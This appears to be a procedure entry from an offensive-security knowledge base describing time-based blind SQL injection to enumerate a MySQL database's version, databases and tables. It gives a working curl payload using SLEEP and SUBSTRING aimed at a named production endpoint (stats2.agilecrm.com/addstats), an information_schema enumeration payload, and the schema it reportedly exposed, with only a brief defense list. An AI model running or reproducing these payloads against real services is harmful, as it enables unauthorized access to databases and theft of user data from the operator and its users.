---
id: proc-433792-extract-schema
tags:
  - data-exfiltration
  - schema-enumeration
  - blind-sqli
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-schema-extract]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Credential Dumping]]'
updated_at: '2025-12-14T03:16:07.767Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Credential Dumping]]'
---
# Extract-Database-Schema-via-Blind-SQL-Injection

## Summary

This procedure uses Blind SQLi to enumerate database details like version, hostname, databases, and tables through conditional queries that rely on response differences or delays.

## Description

With confirmed injection, attackers craft payloads to extract info bit-by-bit, e.g., using SUBSTRING and ASCII for version, or information_schema queries for schema. In this case, it revealed MySQL 5.0.12 on localhost with 'stats' DB containing tables like persons and map, potentially exposing Rocket.Chat user stats.

## Requirements

1. Confirmed Blind SQLi endpoint
2. Knowledge of MySQL system tables (e.g., information_schema)
3. Patience for iterative querying (manual or scripted)

## Defense

Defensive measures and detection strategies:

- Limit database user privileges to essentials
- Encrypt sensitive schema data and monitor query patterns
- Use database activity monitoring (DAM) tools

## Objectives

1. Retrieve database metadata for further attacks
2. Identify sensitive tables with user data
3. Assess potential for lateral movement

## Instructions

### Step 1: Extract Version

**Context**: Use conditional logic to guess characters of @@version.

**Command** ([[commands/curl-schema-extract]]):
```bash
curl 'https://stats2.agilecrm.com/addstats?new=IF(ASCII(SUBSTRING(@@version,1,1))=53, (select*from(select(sleep(5)))a), "normal")'
```

> Delay indicates true (e.g., '5' for MySQL 5); iterate for full "5.0.12".

### Step 2: Enumerate Databases and Tables

**Context**: Query information_schema for schema details.

Adapt payloads like: new=IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='stats')>0, sleep(5), "normal")

> Expected output: Delays confirming databases (information_schema, mysql, performance_schema, stats) and tables (3, persons, map).

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Credential Dumping]]

### Sub-Techniques


## Commands Used

- [[commands/curl-schema-extract]]

## Tools Used


## Tags

- [[data-exfiltration]]
- [[schema-enumeration]]
